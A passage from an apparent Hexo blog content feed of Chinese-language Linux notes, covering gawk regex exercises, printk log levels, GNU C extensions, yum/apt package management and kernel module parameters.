class="line">cat</span><br></pre></td></tr></table></figure></li></ul></li><li><p>表达式分组</p><ul><li><p>正则表达式模式也可以用圆括号分组, 该组会被视为一个标准字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;cat&quot; | gawk &apos;/(c|b)a(a|t)/&#123;print $0&#125;&apos;</span><br></pre></td></tr></table></figure><p>​</p></li></ul></li></ul><h4 id="练习"><a href="#练习" class="headerlink" title="练习:"></a>练习:</h4><ol><li><p>解析匹配电话号码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">匹配电话号码:</span><br><span class="line">(123)456-7890</span><br><span class="line">(123) 456-7890</span><br><span class="line">123-456-7890</span><br><span class="line">123.456.7890</span><br><span class="line"></span><br><span class="line">从左侧开始看:</span><br><span class="line">1. 出现 (  或者直接是区号</span><br><span class="line">^\(?    ## 0 或者 1</span><br><span class="line">2. 区号, 第一个数字是1-9 不可能是0, 共三个数字</span><br><span class="line">[1-9][0-9]&#123;2&#125;    </span><br><span class="line"></span><br><span class="line">\)?</span><br><span class="line">3. 空格 或者 -  或者 . 或者 为空</span><br><span class="line">( |-|\.)?        --&gt; 0个或者1个</span><br><span class="line">4.   三个电话号码</span><br><span class="line">[0-9]&#123;3&#125;</span><br><span class="line">5.  破折号 或者 .</span><br><span class="line">(-|\.)</span><br><span class="line">6. 行尾匹配四个数字</span><br><span class="line">[0-9]&#123;4&#125;$</span><br><span class="line"></span><br><span class="line">^\(?[1-9][0-9]&#123;2&#125;( |-|\.)?[0-9]&#123;3&#125;(-|\.)[0-9]&#123;4&#125;$</span><br><span class="line"></span><br><span class="line">验证:</span><br><span class="line">$echo &quot;123-456-1234&quot; | gawk --re-interval &apos;/^\(?[1-9][0-9]&#123;2&#125;\)?(| |-|\.)[0-9]&#123;3&#125;(-|\.)[0-9]&#123;4&#125;$/&#123;print $0&#125;&apos;  </span><br><span class="line"></span><br><span class="line">$cat phonenum</span><br><span class="line">(234)555-1234</span><br><span class="line">(234) 555-6455</span><br><span class="line">12345</span><br><span class="line">3453262</span><br><span class="line">123-456-7890</span><br><span class="line">123.456.6789</span><br><span class="line"></span><br><span class="line">$cat phonenum| gawk --re-interval &apos;/^\(?[1-9][0-9]&#123;2&#125;\)?(| |-|\.)[0-9]&#123;3&#125;(-|\.)[0-9]&#123;4&#125;$/&#123;print $0&#125;&apos;  </span><br><span class="line">(234)555-1234</span><br><span class="line">(234) 555-6455</span><br><span class="line">123-456-7890</span><br><span class="line">123.456.6789</span><br></pre></td></tr></table></figure></li><li><p>匹配邮箱  <code>username@hostname</code></p><ul><li>username 取值:<ul><li>字母</li><li>数字</li><li>点号</li><li>单破折号</li><li>加号</li><li>下划线</li></ul></li><li>hostname取值:<ul><li>字母</li><li>数字</li><li>点号</li><li>下划线</li></ul></li></ul><p>username:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^([0-9a-zA-Z_\-\.\+]+)</span><br></pre></td></tr></table></figure><p>hostname: 服务器名 与 域名</p><p>服务器名:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">([a-zA-Z0-9_\-\.]+)</span><br></pre></td></tr></table></figure><p>域名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\.([a-zA-Z]&#123;2,6&#125;)$</span><br></pre></td></tr></table></figure><p>即生成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^([0-9a-zA-Z_\-\.\+]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]&#123;2,6&#125;)$</span><br></pre></td></tr></table></figure></li></ol>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Postgres@gangzai.online&quot; |  gawk --re-interval &apos;/^([0-9a-zA-Z_\-\.\+]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]&#123;2,6&#125;)/&#123;print $0&#125;&apos;</span><br></pre></td></tr></table></figure><p><br></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Kernel-printk</title>
      <link href="/2017/12/25/kernel/Kernel-printk/"/>
      <url>/2017/12/25/kernel/Kernel-printk/</url>
      
        <content type="html"><![CDATA[<h3 id="Printk"><a href="#Printk" class="headerlink" title="Printk"></a>Printk</h3><p><code>printk</code> 和 <code>printf</code> 的用法是差不多的，最大区别是<code>printk</code>可以指定打印优先级。</p><p>另外一个区别就是 <code>printf</code>只在用户态  <code>printk</code>用于内核态。</p><a id="more"></a><p><br></p><p>定义于:  <code>$itop_kernel/include/linux/printk.h</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define KERN_EMERG&quot;&lt;0&gt;&quot;/* system is unusable*/</span><br><span class="line">#define KERN_ALERT&quot;&lt;1&gt;&quot;/* action must be taken immediately*/</span><br><span class="line">#define KERN_CRIT&quot;&lt;2&gt;&quot;/* critical conditions*/</span><br><span class="line">#define KERN_ERR&quot;&lt;3&gt;&quot;/* error conditions    */</span><br><span class="line">#define KERN_WARNING  &quot;&lt;4&gt;&quot;/* warning conditions*/</span><br><span class="line">#define KERN_NOTICE&quot;&lt;5&gt;&quot;/* normal but significant condition*/</span><br><span class="line">#define KERN_INFO&quot;&lt;6&gt;&quot;/* informational    */</span><br><span class="line">#define KERN_DEBUG&quot;&lt;7&gt;&quot;/* debug-level messages*/</span><br></pre></td></tr></table></figure><p>而终端控制台的输出优先级配置在文件<code>/proc/sys/kernel/printk</code>中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root: /]# cat /proc/sys/kernel/printk</span><br><span class="line">4417</span><br></pre></td></tr></table></figure><p>4    4    1    7分别是：</p><p>4：console_loglevel    //这个就是控制台的默认优先级</p><p>4：default_message_loglevel    // 这个是printk的默认输出优先级</p><p>1：minimum_console_level</p><p>7：default_console_loglevel</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Arm </tag>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>GNU-C 扩展语法</title>
      <link href="/2017/12/25/cpluscplus/GNU-C-%E6%89%A9%E5%B1%95%E8%AF%AD%E6%B3%95/"/>
      <url>/2017/12/25/cpluscplus/GNU-C-%E6%89%A9%E5%B1%95%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<ol><li>零长度数组</li><li>case  x…y:</li><li>typeof 可以获取x的数据类型</li><li>可变参数的宏</li><li>特殊属性声明</li><li>GNU C 内建函数</li><li>do{}while(0)</li><li>goto</li></ol><a id="more"></a><p><br></p><ol><li><p>零长度数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">var_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">int</span> len;</span><br><span class="line">  <span class="keyword">char</span> data[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="keyword">char</span> var_data.data = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">12</span>);</span><br></pre></td></tr></table></figure><p>但未分配内存地址</p><p>​    sizeof(var_data)  ==  sizeof(len);</p><p>​</p></li><li><p>case  x…y:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'0'</span> ... <span class="string">'9'</span>:   <span class="comment">// case '0':   \  case '1':   ....   case '9:</span></span><br><span class="line">  c -= <span class="string">'0'</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>typeof 可以获取x的数据类型</p><p><img src="/img/cplusplus/typeof_.png" alt="typeof 获取数据类型"></p><p>​</p></li><li><p>可变参数的宏</p><p>标准C只支持可变参数的函数， 函数的参数并不固定。</p><p>printf:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *format [, argument] ...)</span></span></span><br></pre></td></tr></table></figure><p><strong>GNU C 宏也可以接受可变数据的参数 </strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pr_debug(fmt, arg...) \    <span class="comment">//  arg...  第二形参</span></span></span><br><span class="line">printk(fmt, ##arg)</span><br><span class="line"></span><br><span class="line">引用:</span><br><span class="line">pr_debug(<span class="string">"%s:%d"</span>, filename, line)</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>特殊属性声明</p><p>GNU C允许声明函数,变量和类型的特殊属性，以便进行手工的代码优化和定制代码检查的方法.</p><p>​    指定一个声明属性，在其声明后添加:  __attribute__((ATTRIBUTE)) , ATTRIBUTE 为属性说明</p><p>​</p></li><li><p>GNU C 内建函数</p><ol><li><p>__builtin_return_address(LEVEL) 返回当前函数或其调用者的返回地址, 参数LEVEL指定调用栈的级别:</p><ol><li><p>0 标识当前函数的返回地址 </p></li><li><p>1 标识当前函数调用者的返回地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"   %p\n"</span>, __builtin_return_address(<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>​</p></li></ol></li><li><p>__builtin_constant_p(EXP) 用于判断一个值是否为编译时常数</p><ol><li>EXP 的值是常数， 返回 1    否则 返回 0</li></ol></li><li><p>__builtin_expect(EXP, C) 用于为编译器提供分支预测信息，返回值是整数表达式EXP的值, C的值必须是编译时常数</p><p>​</p></li></ol></li><li><p>do{}while(0)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define SAFE_FREE(p)  do&#123; free(p), p = NULL; &#125; while(0)</span><br></pre></td></tr></table></figure><p>防止 if  单句引用宏被展开，引起歧义与混乱</p><p>​</p></li><li><p>goto</p><ol><li><p>限制于错误处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if  ....</span><br><span class="line">goto err1;</span><br><span class="line">if...</span><br><span class="line"></span><br><span class="line">err1:</span><br><span class="line">...;</span><br><span class="line">err2:</span><br><span class="line">...;</span><br></pre></td></tr></table></figure><p>​</p></li></ol></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux PMS 包管理工具</title>
      <link href="/2017/12/22/commands/Linux-PMS-%E5%8C%85%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/"/>
      <url>/2017/12/22/commands/Linux-PMS-%E5%8C%85%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p>PMS(Package Management  System) 包管理系统: 用来进行软件安装，管理和删除命令行工具</p><p>Linux 中广泛使用的两种主要PMS基础工具是 dpkg 和 rpm</p><p>基于Debian的发行版(如Ubuntu和Linux Mint)使用的是dpkg命令</p><p>基于Red Hat的发行版(如Fedora, openSUSE及Mandriva)使用rpm命令</p><a id="more"></a><p><br></p><h4 id="基于Red-Hat-的系统"><a href="#基于Red-Hat-的系统" class="headerlink" title="基于Red Hat 的系统"></a>基于Red Hat 的系统</h4><ol><li><p>列出已安装包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum  list  installed  ## 找出系统已安装包</span><br><span class="line"></span><br><span class="line">yum  list  vim   ## 找出特定软件包详细信息</span><br><span class="line"></span><br><span class="line">yum  provides file_name ## 特定某个特定文件属于哪个软件包</span><br><span class="line">     yum   provides /etc/yum.conf</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>安装软件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum  install package_name</span><br><span class="line"></span><br><span class="line">yum  localinstall package_name.rpm   ## 手动下载rpm文件，并用yum安装</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>更新软件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum  list  updates   ## 列出所有已安装包的可以更新</span><br><span class="line"></span><br><span class="line">yum  update  package_name  ## 更新单个软件包</span><br><span class="line"></span><br><span class="line">yum  update          ## 更新列表</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>卸载软件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum  remove  package_name   ## 只删除软件包而保留配置文件和数据文件</span><br><span class="line"></span><br><span class="line">yum  erase   pachage_name   ## 删除软件和所有文件</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>处理损坏的包依赖关系</p><p>有时在安装多个软件包时,某个包的软件依赖关系可能会被另一个包的安装覆盖掉. 这就叫做 <strong>损坏的包依赖关系</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. yum  clean  all  &amp;&amp; yum update   ## 清理放错位置的文件恢复， 否则，再执行下一步</span><br><span class="line"></span><br><span class="line">2. yum  deplist package_name        ## 仍未解决 执行 3</span><br><span class="line"></span><br><span class="line">3. yum  update  --skip-broken       ## --skip-broken 允许忽略依赖关系损坏包，继续更新其他软件包</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">确认vim 包依赖关系:</span><br><span class="line">yum  deplist vim</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>软件仓库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum  repolist                ## yum 仓库位于  /etc/yum.repos.d</span><br></pre></td></tr></table></figure></li></ol><p><br></p><h4 id="基于Debian-的系统"><a href="#基于Debian-的系统" class="headerlink" title="基于Debian 的系统"></a>基于Debian 的系统</h4><ul><li>apt-get</li><li>apt-cache</li><li>aptitude</li></ul><p><br></p><h6 id="aptitude"><a href="#aptitude" class="headerlink" title="aptitude"></a>aptitude</h6><ol><li><p>显示软件包详情</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aptitude show package_name</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>显示特定包相关文件列表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dpkg -L  package_name</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>## 查询特定文件属于哪个软件包</span><br><span class="line">dpkg --search  abs_file_name ## 必须 使用绝对路径</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>安装软件包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aptitude search package_name  ## 查询软件包</span><br><span class="line">包名 显示</span><br><span class="line">i  :  已经安装到你的系统上</span><br><span class="line">p 或 v : 这个包可以用，但还没有安装</span><br><span class="line">c  :  意味着删除软件包，但是配置文件尚未删除</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>更新软件包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aptitude safe-upgrade   ## 妥善地更新系统上所有的软件包</span><br><span class="line">aptitude full-upgrade   ## </span><br><span class="line">aptitude dist-upragde   ##</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>卸载软件包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aptitude  remove  vim  ## 只删除软件包,不删除数据和配置文件</span><br><span class="line">aptitude  purge  vim   ## 删除软件包，并删除数据 和 配置文件</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>aptitude 仓库</p><p>具体存储文件位于 /etc/apt/sources.list中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deb (or deb-src)  address  distribution_name package_type_list</span><br></pre></td></tr></table></figure><p>deb  or  deb-src 表明软件包的类型</p><p>address  软件仓库地址</p><p>distribution_name 特定软件仓库的发行版版本名称</p><p>package_type_list   表明仓库里面有什么类型的包; 诸如:  main restricted universe partner</p><p>具体可以参照:  /etc/apt/sources.list</p></li></ol><p><br></p><h6 id="apt-get"><a href="#apt-get" class="headerlink" title="apt-get:"></a>apt-get:</h6><ol><li><p>安装软件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install chromium-browser</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>更新软件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update      ## 更新本地软件包索引，本地软件包索列出了软件仓库中所有可安装的软件包 以及版本信息</span><br><span class="line"></span><br><span class="line">apt-get upgrade       ## 用来升级系统上可以升级的软件包</span><br><span class="line"></span><br><span class="line">apt-get dist-upgrade  ## 升级系统版本</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>卸载软件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">apt-get remove firefox   ## 删除软件包，但不会删除软件包的配置文件</span><br><span class="line"></span><br><span class="line">apt-get purge  firefox   ## 删除软件包,同时删除配置文件 以及数据文件</span><br><span class="line"></span><br><span class="line">apt-get clean   ## apt-get 安装或者升级软件包的时候,会将deb安装包下载到文件系统/var/cache/apt/archives目录下，clean可以删除这些deb安装包</span><br><span class="line"></span><br><span class="line">apt-get autoclean   ## 删除Debian不维护的/var/.../archives 的deb安装包</span><br><span class="line"></span><br><span class="line">apt-get autoremove  ## 删除不需要的依赖软件包</span><br></pre></td></tr></table></figure></li></ol><p><br></p><h4 id="源码安装"><a href="#源码安装" class="headerlink" title="源码安装"></a>源码安装</h4><p> <a href="https://pkgs.org/" target="_blank" rel="noopener">软件包</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar  -xvf  package_name  ## 解压</span><br><span class="line"></span><br><span class="line">./configure   ## 其中有一系列配置参数， 最为基础为安装路径    可采用默认   具体查看 configure 文件</span><br><span class="line"></span><br><span class="line">make  &amp;&amp; make install   ## 安装到系统</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 包管理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Kernel_module_param</title>
      <link href="/2017/12/16/kernel/Kernel-module-param/"/>
      <url>/2017/12/16/kernel/Kernel-module-param/</url>
      
        <content type="html"><![CDATA[<h3 id="module-param-内核传参"><a href="#module-param-内核传参" class="headerlink" title="module_param  内核传参"></a>module_param  内核传参</h3><p>用户态C语言中， 函数传参使用main(int argc, char ** argv)， 而内核态传参数使用:</p><ul><li>在内核函数中使用 module_param指定模块参数。</li><li>加载内核时传递参数给模块。</li></ul><a id="more"></a><p><br></p><h4 id="module-param-函数"><a href="#module-param-函数" class="headerlink" title="module_param 函数"></a>module_param 函数</h4><p><code>$itop_kernel/include/linux/moduleparam.h</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * module_param - typesafe helper for a module/cmdline parameter</span><br><span class="line"> * @value: the variable to alter, and exposed parameter name.</span><br><span class="line"> * @type: the type of the parameter</span><br><span class="line"> * @perm: visibility in sysfs.</span><br><span class="line"> *</span><br><span class="line"> * @value becomes the module parameter, or (prefixed by KBUILD_MODNAME and a</span><br><span class="line"> * &quot;.&quot;) the kernel commandline parameter.  Note that - is changed to _, so</span><br><span class="line"> * the user can use &quot;foo-bar=1&quot; even for variable &quot;foo_bar&quot;.</span><br><span class="line"> *</span><br><span class="line"> * @perm is 0 if the the variable is not to appear in sysfs, or 0444</span><br><span class="line"> * for world-readable, 0644 for root-writable, etc.  Note that if it</span><br><span class="line"> * is writable, you may need to use kparam_block_sysfs_write() around</span><br><span class="line"> * accesses (esp. charp, which can be kfreed when it changes).</span><br><span class="line"> *</span><br><span class="line"> * The @type is simply pasted to refer to a param_ops_##type and a</span><br><span class="line"> * param_check_##type: for convenience many standard types are provided but</span><br><span class="line"> * you can create your own by defining those variables.</span><br><span class="line"> *</span><br><span class="line"> * Standard types are:</span><br><span class="line"> *byte, short, ushort, int, uint, long, ulong</span><br><span class="line"> *charp: a character pointer</span><br><span class="line"> *bool: a bool, values 0/1, y/n, Y/N.</span><br><span class="line"> *invbool: the above, only sense-reversed (N = true).</span><br><span class="line"> */</span><br><span class="line">#define module_param(name, type, perm)\</span><br><span class="line">module_param_named(name, name, type, perm)</span><br><span class="line">/**</span><br><span class="line">*  name: 内核中参数的名称</span><br><span class="line">*  type: 数据类型,  byte, short, int, long, ulong, bool, charp(字符指针)</span><br><span class="line">*  perm: 内核参数权限。   可以查看 include/linux/stat.h</span><br><span class="line">**/</span><br><span class="line"></span><br><span class="line">#define S_ISUID  0004000</span><br><span class="line">#define S_ISGID  0002000</span><br><span class="line">#define S_ISVTX  0001000</span><br><span class="line"></span><br><span class="line">#define S_IRWXU 00700</span><br><span class="line">#define S_IRUSR 00400</span><br><span class="line">#define S_IWUSR 00200</span><br><span class="line">#define S_IXUSR 00100</span><br><span class="line"></span><br><span class="line">#define S_IRWXG 00070</span><br><span class="line">#define S_IRGRP 00040</span><br><span class="line">#define S_IWGRP 00020</span><br><span class="line">#define S_IXGRP 00010</span><br><span class="line"></span><br><span class="line">#define S_IRWXO 00007</span><br><span class="line">#define S_IROTH 00004</span><br><span class="line">#define S_IWOTH 00002</span><br><span class="line">#define S_IXOTH 00001</span><br><span class="line"></span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">#ifdef __KERNEL__</span><br><span class="line">#define S_IRWXUGO(S_IRWXU|S_IRWXG|S_IRWXO)</span><br><span class="line">#define S_IALLUGO(S_ISUID|S_ISGID|S_ISVTX|S_IRWXUGO)</span><br><span class="line">#define S_IRUGO(S_IRUSR|S_IRGRP|S_IROTH)</span><br><span class="line">#define S_IWUGO(S_IWUSR|S_IWGRP|S_IWOTH)</span><br><span class="line">#define S_IXUGO(S_IXUSR|S_IXGRP|S_IXOTH)</span><br></pre></td></tr></table></figure><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;linux/init.h&gt;</span><br><span class="line">#include &lt;linux/module.h&gt;</span><br><span class="line">#include &lt;linux/stat.h&gt;</span><br><span class="line">#include &lt;linux/moduleparam.h&gt;</span><br><span class="line"></span><br><span class="line">static int age = 25;</span><br><span class="line">static char *name = &quot;Li Gang&quot;;</span><br><span class="line"></span><br><span class="line">static int __init hello_init(void)</span><br><span class="line">&#123;</span><br><span class="line">printk(&quot;age = %d, name = [ %s ]\n&quot;, age, name);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">static void __exit hello_exit(void)</span><br><span class="line">&#123;</span><br><span class="line">printk(&quot;module: exit hello module\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br><span class="line"></span><br><span class="line">module_param(age, int, 0754);</span><br><span class="line">module_param(name, charp, 0754);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);</span><br><span class="line">MODULE_AUTHOR(&quot;rocky&quot;);</span><br></pre></td></tr></table></figure><p><strong>运行</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo insmod module_param.ko age=100</span><br><span class="line">Dec 22 00:11:53 ubuntu kernel: [54928.625291] age = 100, name = [ Li Gang ]</span><br><span class="line"></span><br><span class="line">$ sudo 